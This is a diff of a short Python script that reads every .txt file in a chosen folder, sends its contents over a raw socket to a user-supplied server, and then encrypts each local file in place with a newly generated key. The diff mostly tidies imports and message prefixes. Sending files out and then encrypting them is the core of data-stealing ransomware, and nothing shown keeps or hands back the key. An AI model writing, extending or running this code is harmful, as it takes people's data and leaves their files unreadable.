@@ -1,6 +1,6 @@
 import socket
 import os
-import python_encryptor
+from python_encryptor import encrypt, key_generate
 import sys
 from time import sleep
 
@@ -8,21 +8,21 @@ CHUNKSIZE = 1_000_000
 
 while True:
     
-    host_ip = sys.argv[1]
+    host_ip = input("[+] Please type in the ip-address of the server, you want to send the data: ")
     
-    path = input("Please type in the full path to your folder you want to send\nSyntax: C:/folder/.../file\n")
+    path = input("[+] Please type in the full path to your folder you want to send\nSyntax: C:/folder/.../file\n")
     
     
     
     if path == None:
-        print("Something went wrong. Please check your syntax!")
-        print("Program stopped!")
+        print("[!] Something went wrong. Please check your syntax!")
+        print("[!] Program stopped!")
         exit(1)
 
     files = os.listdir(path)
     txt_files = [file for file in files if file.endswith(".txt")]
     
-    key = python_encryptor.key_generate()
+    key = key_generate()
     
     for file in txt_files:
         sock = socket.socket()
@@ -36,17 +36,11 @@ while True:
             sock.send(data.encode())
             data = file.read(1024)
             
-        print("{} ist leer".format(file))
+        print("[i] {} ist leer".format(file))
         sleep(3)
         sock.close()
-
-
         
-        print("{} will be opened now!".format(file_path))
         file_data = open(file_path, "r")
-        print("{} got opened now!".format(file_path))
         data = file_data.read()
-        print("{} got read in!".format(file_path))
         file_data.close()
-        print("{} got encrypted!".format(file_path))
-        python_encryptor.encrypt(data, file_path, key)
+        encrypt(data, file_path, key)
